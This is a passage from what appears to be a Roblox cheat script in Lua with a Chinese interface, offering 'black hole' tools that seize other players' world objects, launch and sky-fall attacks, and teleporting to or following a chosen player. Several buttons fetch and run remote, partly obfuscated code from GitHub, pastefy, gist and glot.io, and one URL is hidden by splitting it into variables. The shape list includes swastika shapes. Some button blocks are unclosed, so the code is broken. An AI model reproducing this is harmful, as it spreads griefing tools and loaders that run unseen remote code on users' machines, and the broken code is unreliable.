                "斐波那契球体", "星形", "螺旋臂", "堆叠", "环面", "双螺旋", 
                "立方体网格", "金字塔", "圆柱体", "波浪环", "随机云", 
                "卍字型", "卍字型(旗帜)",
                "巨龙螺旋", "雷神之锤", "魔法阵", "战神之剑", "凤凰展翅", 
                "黑洞漩涡", "帝王皇冠", "雷霆风暴", "末日堡垒", "神圣十字架",
                "泰坦战斧", "深渊魔眼", "天使六翼", "地狱熔炉", "时空法轮",
                "战争机甲", "元素王座", "恶魔鬼面", "圣光十字", "黑洞奇点",
                "终极泰坦核心"
            },
            Default = "斐波那契球体",
            Text = "形状类型",
            Callback = function(value)
                shapeType = value
            end
        })
        
        shapeControlBox:AddDropdown("FacingMode", {
            Values = {"默认", "固定方向", "指向目标"},
            Default = "默认",
            Text = "朝向模式",
            Callback = function(value)
                shapeFacingMode = value
            end
        })
        
        shapeControlBox:AddSlider("RadiusSlider", {
            Text = "大小",
            Default = 50,
            Min = 20,
            Max = 200,
            Rounding = 0,
            Callback = function(value)
                shapeSize = value
            end
        })
        
        shapeControlBox:AddSlider("SpeedSlider", {
            Text = "旋转速度",
            Default = 0.5,
            Min = 0.1,
            Max = 10,
            Rounding = 1,
            Callback = function(value)
                rotationSpeed = value
            end
        })
        
        shapeControlBox:AddSlider("OffsetSlider", {
            Text = "与玩家距离",
            Default = 40,
            Min = 0,
            Max = 200,
            Rounding = 0,
            Callback = function(value)
                distanceFromPlayer = value
            end
        })
        
        shapeControlBox:AddSlider("SuctionSlider", {
            Text = "吸力倍数",
            Default = 1,
            Min = 0.01,
            Max = 5,
            Rounding = 2,
            Callback = function(value)
                suctionMultiplier = value
            end
        })
        
        shapeControlBox:AddToggle("FixPositionToggle", {
            Text = "固定位置",
            Default = false,
            Callback = function(value)
                if value then
                    isPositionFixed = false
                    fixedShapePosition = getShapeCenter()
                    isPositionFixed = true
                    obsidianLib:Notify({
                        Title = "位置锁定",
                        Description = "形状已固定在: " .. string.format("(%.1f, %.1f, %.1f)", fixedShapePosition.X, fixedShapePosition.Y, fixedShapePosition.Z),
                        Time = 3
                    })
                else
                    isPositionFixed = false
                    obsidianLib:Notify({
                        Title = "位置解锁",
                        Description = "形状恢复跟随模式",
                        Time = 2
                    })
                end
            end
        })
        
        shapeControlBox:AddButton({
            Text = "重置属性(UI不会重置)",
            Func = function()
                shapeEnabled = false
                shapeType = "斐波那契球体"
                shapeSize = 50
                rotationSpeed = 0.5
                distanceFromPlayer = 40
                suctionMultiplier = 1
                shapeFacingMode = "默认"
                shapeOrientation = {X = 0, Y = 0, Z = 0}
                shapeFixedRotation = CFrame.Angles(0, 0, 0)
                isPositionFixed = false
                fixedShapePosition = Vector3.new(0, 0, 0)
                
                shapeControlBox.Options.ShapeToggle:SetValue(false)
                shapeControlBox.Options.ShapeSelector:SetValue("斐波那契球体")
                shapeControlBox.Options.FacingMode:SetValue("默认")
                shapeControlBox.Options.FixPositionToggle:SetValue(false)
                shapeControlBox.Options.RadiusSlider:SetValue(50)
                shapeControlBox.Options.SpeedSlider:SetValue(0.5)
                shapeControlBox.Options.OffsetSlider:SetValue(40)
                shapeControlBox.Options.SuctionSlider:SetValue(1)
                
                obsidianLib:Notify({
                    Title = "重置完成",
                    Description = "所有形状控制设置已重置为默认值",
                    Time = 2
                })
            end
        })
        
        local orientationBox = uiTabs.Main:AddRightGroupbox("形状朝向设置")
        
        orientationBox:AddSlider("FixedYaw", {
            Text = "水平旋转",
            Default = 0,
            Min = -180,
            Max = 180,
            Rounding = 0,
            Callback = function(value)
                local yaw = math.rad(value)
                local pitch = math.rad(shapeOrientation.X)
                local roll = math.rad(shapeOrientation.Z)
                shapeFixedRotation = CFrame.Angles(pitch, yaw, roll)
            end
        })
        
        orientationBox:AddSlider("FixedPitch", {
            Text = "俯仰角度",
            Default = 0,
            Min = -90,
            Max = 90,
            Rounding = 0,
            Callback = function(value)
                local pitch = math.rad(value)
                local yaw = math.rad(shapeOrientation.Y)
                local roll = math.rad(shapeOrientation.Z)
                shapeFixedRotation = CFrame.Angles(pitch, yaw, roll)
            end
        })
        
        orientationBox:AddButton({
            Text = "重置朝向(UI不会重置)",
            Func = function()
                shapeOrientation = {X = 0, Y = 0, Z = 0}
                shapeFixedRotation = CFrame.Angles(0, 0, 0)
                orientationBox.Options.FixedYaw:SetValue(0)
                orientationBox.Options.FixedPitch:SetValue(0)
                obsidianLib:Notify({
                    Title = "朝向设置",
                    Description = "已重置为默认朝向",
                    Time = 2
                })
            end
        })
        
        local skyFallBox = uiTabs.Main:AddRightGroupbox("天降区")
        
        skyFallBox:AddButton({
            Text = "设置标记",
            Func = function()
                local localRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not localRootPart then
                    obsidianLib:Notify({
                        Title = "标记失败",
                        Description = "无法获取玩家位置",
                        Time = 2
                    })
                    return
                end
                
                markedPosition = localRootPart.Position + Vector3.new(0, 5, 0)
                
                if markPart then
                    markPart:Destroy()
                end
                
                markPart = createMarkPart(markedPosition)
                
                obsidianLib:Notify({
                    Title = "标记设置",
                    Description = "天降标记已设置在角色上方5米",
                    Time = 2
                })
            end
        })
        
        skyFallBox:AddButton({
            Text = "启动天降",
            Func = function()
                if not markedPosition then
                    obsidianLib:Notify({
                        Title = "天降失败",
                        Description = "请先点击'设置标记'按钮创建标记点",
                        Time = 2
                    })
                    return
                end
                
                if not shapeEnabled then
                    obsidianLib:Notify({
                        Title = "天降失败",
                        Description = "请先启用形状控制",
                        Time = 2
                    })
                    return
                end
                
                if isSkyFalling then
                    obsidianLib:Notify({
                        Title = "天降警告",
                        Description = "天降正在进行中，请等待完成",
                        Time = 2
                    })
                    return
                end
                
                skyFallStartPosition = getShapeCenter()
                isSkyFalling = true
                skyFallPhase = "ascending"
                launchElapsedTime = 0
                
                obsidianLib:Notify({
                    Title = "天降启动",
                    Description = "形状正在保持完整形态升空到1000米高度...",
                    Time = 3
                })
            end
        })
        
        skyFallBox:AddButton({
            Text = "强制重置天降",
            Func = function()
                isSkyFalling = false
                skyFallPhase = "ascending"
                launchElapsedTime = 0
                
                if markPart then
                    markPart:Destroy()
                    markPart = nil
                end
                markedPosition = nil
                
                isPositionFixed = false
                fixedShapePosition = Vector3.new(0, 0, 0)
                
                obsidianLib:Notify({
                    Title = "天降重置",
                    Description = "天降已强制停止，形状恢复玩家控制",
                    Time = 2
                })
            end
        })
        
        skyFallBox:AddSlider("SkyFallSpeed", {
            Text = "天降速度",
            Default = 300,
            Min = 100,
            Max = 1000,
            Rounding = 0,
            Callback = function(value)
                skyFallSpeed = value
            end
        })
        
        local launchBox = uiTabs.Main:AddLeftGroupbox("形状发射区")
        
        launchBox:AddSlider("LaunchSpeedSlider", {
            Text = "发射速度",
            Default = 50,
            Min = 10,
            Max = 500,
            Rounding = 0,
            Callback = function(value)
                launchSpeed = value
            end
        })
        
        launchBox:AddSlider("LaunchDistanceSlider", {
            Text = "发射距离",
            Default = 100,
            Min = 20,
            Max = 1000,
            Rounding = 0,
            Callback = function(value)
                launchDistance = value
            end
        })
        
        launchBox:AddButton({
            Text = "启动发射",
            Func = function()
                if shapeEnabled and not isLaunching then
                    isPositionFixed = false
                    isLaunching = true
                    launchElapsedTime = 0
                    launchRotationSnapshot = timeAccumulator
                    
                    local camera = workspaceService.CurrentCamera
                    launchStartPos = getShapeCenter()
                    launchDirection = camera.CFrame.LookVector
                    
                    obsidianLib:Notify({
                        Title = "形状发射",
                        Description = "形状正在以速度 " .. launchSpeed .. " 向正前方发射，距离: " .. launchDistance,
                        Time = 3
                    })
                elseif isLaunching then
                    obsidianLib:Notify({
                        Title = "发射警告",
                        Description = "发射正在进行中，请等待完成",
                        Time = 2
                    })
                else
                    obsidianLib:Notify({
                        Title = "发射失败",
                        Description = "请先启用形状！",
                        Time = 2
                    })
                end
            end
        })
        
        launchBox:AddButton({
            Text = "强制取消发射",
            Func = function()
                if isLaunching then
                    isLaunching = false
                    launchElapsedTime = 0
                    obsidianLib:Notify({
                        Title = "发射取消",
                        Description = "形状发射已强制停止，恢复跟随模式",
                        Time = 2
                    })
                else
                    obsidianLib:Notify({
                        Title = "取消失败",
                        Description = "当前没有正在进行的发射",
                        Time = 2
                    })
                end
            end
        })
        
        launchBox:AddButton({
            Text = "重置发射位置",
            Func = function()
                if isPositionFixed then
                    isPositionFixed = false
                    fixedShapePosition = Vector3.new(0, 0, 0)
                    shapeControlBox.Options.FixPositionToggle:SetValue(false)
                    obsidianLib:Notify({
                        Title = "位置重置",
                        Description = "形状位置已重置，回到玩家身边",
                        Time = 2
                    })
                else
                    obsidianLib:Notify({
                        Title = "重置失败",
                        Description = "形状未在固定位置",
                        Time = 2
                    })
                end
            end
        })
        
        local followModeToggle = targetPlayerBox:AddToggle("FollowMode", {
            Text = "跟随目标",
            Default = false,
            Callback = function(value)
                followMode = value
                if value and targetPlayerName then
                    obsidianLib:Notify({
                        Title = "目标模式",
                        Description = "正在跟随: " .. targetPlayerName,
                        Time = 2
                    })
                end
            end
        })
        
        local playerDropdown = targetPlayerBox:AddDropdown("PlayerSelector", {
            Values = getPlayerList(),
            Default = "",
            Text = "选择玩家",
            Callback = function(value)
                targetPlayerName = value
            end
        })
        
        targetPlayerBox:AddButton({
            Text = "传送到目标",
            Func = function()
                if targetPlayerName then
                    local targetPlayer = playersService:FindFirstChild(targetPlayerName)
                    if targetPlayer and targetPlayer.Character then
                        local targetRootPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                        local playerRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
                        
                        if targetRootPart and playerRootPart then
                            playerRootPart.CFrame = targetRootPart.CFrame
                            obsidianLib:Notify({
                                Title = "传送",
                                Description = "已传送到 " .. targetPlayerName,
                                Time = 2
                            })
                        end
                    end
                else
                    obsidianLib:Notify({
                        Title = "传送失败",
                        Description = "请先选择一个玩家目标",
                        Time = 2
                    })
                end
            end
        })
        
        playersService.PlayerAdded:Connect(function(player)
            task.wait(0.5)
            playerDropdown:SetValues(getPlayerList())
        end)
        
        playersService.PlayerRemoving:Connect(function(player)
            playerDropdown:SetValues(getPlayerList())
            if targetPlayerName == player.Name then
                targetPlayerName = nil
                followMode = false
                followModeToggle:SetValue(false)
            end
        end)
        
        local announcementBox = uiTabs.Announcement:AddLeftGroupbox("公告区")
        
        announcementBox:AddButton({
            Text = "复制寄吧",
            Func = function()
                local scriptLink = "寄吧"
                if setclipboard then
                    setclipboard(scriptLink)
                    obsidianLib:Notify({
                        Title = "公告",
                        Description = "寄吧已复制到剪贴板！",
                        Time = 3
                    })
                else
                    obsidianLib:Notify({
                        Title = "公告",
                        Description = "剪贴板功能不可用，请手动复制",
                        Time = 3
                    })
                end
            end
        })
        
        announcementBox:AddButton({
            Text = "复制何以为",
            Func = function()
                local qqLink = "何以为"
                if setclipboard then
                    setclipboard(qqLink)
                    obsidianLib:Notify({
                        Title = "公告",
                        Description = "何以为已复制到剪贴板！",
                        Time = 3
                    })
                else
                    obsidianLib:Notify({
                        Title = "公告",
                        Description = "剪贴板功能不可用，请手动复制",
                        Time = 3
                    })
                end
            end
        })
        
    end
    
    pcall(mainScriptLoader)
end
end)
blackhole:Button("超级形部件V1", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BS/refs/heads/main/%E6%9B%BF%E8%BA%AB.txt"))()
end)

end)
blackhole:Button("超级形部件V2融合版(最推荐)", function()
loadstring(game:HttpGet(('https://pastefy.app/BbXuvVkK/raw'),true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BS/refs/heads/main/Protected_8223477220888058.lua%20(1).txt"))()

blackhole:Button("超级形部件V3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/11284/refs/heads/main/Protected_6980301799988851.lua.txt"))()

blackhole:Button("黑洞控制道具", function()
game.Players.LocalPlayer.SimulationRadius = 1000

local input = game:GetService("UserInputService")
local players = game:GetService("Players")
local player = players.LocalPlayer
local mouse = player:GetMouse()

local createdBodyPositions = {}

-- 创建工具的函数
local function createTool()
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "黑洞工具"
    tool.Parent = player.Backpack
    tool.ToolTip = "卸下即停止吸附部件"

    local function moveParts(target)
        local function updatePart(part)
            if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(player.Character) then
                local bp = part:FindFirstChildOfClass("BodyPosition")
                if not bp then
                    bp = Instance.new("BodyPosition")
                    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bp.Parent = part
                    table.insert(createdBodyPositions, bp)
                end
                bp.Position = target
            end
        end

        for _, part in pairs(workspace:GetDescendants()) do
            updatePart(part)
        end

        workspace.DescendantAdded:Connect(updatePart)
    end

    local function clearBodyPositions()
        for _, bp in pairs(createdBodyPositions) do
            if bp and bp.Parent then
                bp:Destroy()
            end
        end
        createdBodyPositions = {}
    end

    local isHolding = false

    local function updatePartsFollowingMouse()
        while isHolding do
            currentTarget = mouse.Hit.p
            if currentTarget then
                moveParts(currentTarget)
            end
            task.wait(0) -- 每帧更新
        end
    end

    -- 工具激活逻辑
    tool.Activated:Connect(function()
        if not isHolding then
            isHolding = true
            if input.TouchEnabled then
                -- 移动端：点击时设置一次位置
                local targetPosition = mouse.Hit.p
                moveParts(targetPosition)
                isHolding = false
            else
                -- PC端：开始拖拽
                updatePartsFollowingMouse()
            end
        end
    end)

    -- 工具卸下逻辑
    tool.Unequipped:Connect(function()
        isHolding = false
        clearBodyPositions()
    end)

    -- 监听鼠标按键事件（PC）
    input.InputBegan:Connect(function(inputObj)
        if inputObj.UserInputType == Enum.UserInputType.MouseButton1 and player.Character:FindFirstChildOfClass("Tool") == tool then
            if not isHolding and not input.TouchEnabled then
                isHolding = true
                updatePartsFollowingMouse()
            end
        end
    end)

    input.InputEnded:Connect(function(inputObj)
        if inputObj.UserInputType == Enum.UserInputType.MouseButton1 and player.Character:FindFirstChildOfClass("Tool") == tool then
            isHolding = false
        end
    end)

    -- 监听场景中的触摸事件（移动端）
    input.TouchTapInWorld:Connect(function(touchPositions, gameProcessedEvent)
        if not gameProcessedEvent and player.Character:FindFirstChildOfClass("Tool") == tool then
            local touchPosition = touchPositions[1]
            local targetPosition = workspace.CurrentCamera:ScreenPointToRay(touchPosition.X, touchPosition.Y).Origin
            moveParts(targetPosition)
        end
    end)
end

createTool()

player.CharacterAdded:Connect(function()
    player.Character:WaitForChild("Humanoid")
    createTool()
end)
end)
blackhole:Button("辅助脚本", function()
local function loadRochipsUniversal()
    local z_x = "gzrux646yj/raw/main.ts"
    local z_z = "https://glot.io/snippets/"
    local im, lonely, z_c = task.wait, game, loadstring
    
    local fullUrl = z_z .. z_x
    local success, result = pcall(function()
        return z_c(lonely:HttpGet(fullUrl))()
    end)
    
    if success then
        return "加载成功"
    else
        return "加载失败: " .. tostring(result)
    end
end

if true then
    loadRochipsUniversal()
end
end)
blackhole:Button("辅助脚本第2种", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/AxolotlBmgo/8888080921c2b426a32dd9ff587baff1/raw/d45e03afed3c1716f36523bbf6dd741d3d2aad00/gistfile1.txt"))()
end)
blackhole:Button("黑洞之神(别人应该看不见)", function()
  local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local MaxRange = 100  -- Set your maximum range

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")

if not HumanoidRootPart then
    print("Cannot find the HumanoidRootPart of your character. Please ensure your character has been fully loaded.")
    return
end

local Attachment1 = Instance.new("Attachment", HumanoidRootPart)

local function TeleportPart(v)
    if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
        Mouse.TargetFilter = v
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end

        v.CanCollide = false 

        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)

        AlignPosition.MaxForce = math.huge 
        AlignPosition.MaxVelocity = math.huge 
        AlignPosition.Responsiveness = math.huge  -- Always within suction range
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function TeleportAllParts()
    for _, v in next, game:GetService("Workspace"):GetDescendants() do
        TeleportPart(v)
    end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(TeleportPart)

UserInputService.InputBegan:Connect(function(Key, Chat)
    if Key.KeyCode == Enum.KeyCode.E and not Chat then
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
    end
end)

spawn(function()
    while game:GetService("RunService").RenderStepped:Wait() do
        Attachment1.WorldCFrame = Mouse.Hit + Vector3.new(0, 5, 0)
        -- Force to stay within the suction range
        for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") and v.Parent ~= Character and not v:IsDescendantOf(Character) then
                local dist = (v.Position - HumanoidRootPart.Position).Magnitude
                if dist > MaxRange then
                    v.Position = HumanoidRootPart.Position + (v.Position - HumanoidRootPart.Position).Unit * MaxRange
                end
            end
        end
    end
end)
end)
blackhole:Button("最垃圾黑洞(配合指令“tpua”使用)", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
end)
blackhole:Button("普通黑洞(E键控制)", function()
print('Hello World!');local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local Attachment1 = Instance.new("Attachment", Part)

local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local ForceStrength = math.huge

local function TeleportPart(v)
   if v:IsA("Part") and v.Anchored == false and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       Mouse.TargetFilter = v
       for _, x in next, v:GetChildren() do
           if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
               x:Destroy()
           end
       end
       if v:FindFirstChild("Attachment") then
           v:FindFirstChild("Attachment"):Destroy()
       end

       v.CanCollide = false

       local Torque = Instance.new("BodyAngularVelocity", v)
       Torque.AngularVelocity = Vector3.new(0, math.rad(ForceStrength * 4), 0) -- 更快的旋转速度

       local AlignPosition = Instance.new("AlignPosition", v)
       local Attachment2 = Instance.new("Attachment", v)

       AlignPosition.MaxForce = math.huge
       AlignPosition.MaxVelocity = math.huge
       AlignPosition.Responsiveness = math.huge  -- 始终在吸取范围内
       AlignPosition.Attachment0 = Attachment2
       AlignPosition.Attachment1 = Attachment1
   end
end

local function TeleportAllParts()
   for _, v in next, game:GetService("Workspace"):GetDescendants() do
       if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
           TeleportPart(v)
       end
   end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(function(v)
   if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       TeleportPart(v)
   end
end)

UserInputService.InputBegan:Connect(function(Key, Chat)
   if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
   end
end)

spawn(function()
   while game:GetService("RunService").RenderStepped:Wait() do
       Attachment1.WorldCFrame = Updated
   end
end)

blackhole:Button("终极黑洞", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/11284/refs/heads/main/Protected_2793948043438411.lua.txt"))()
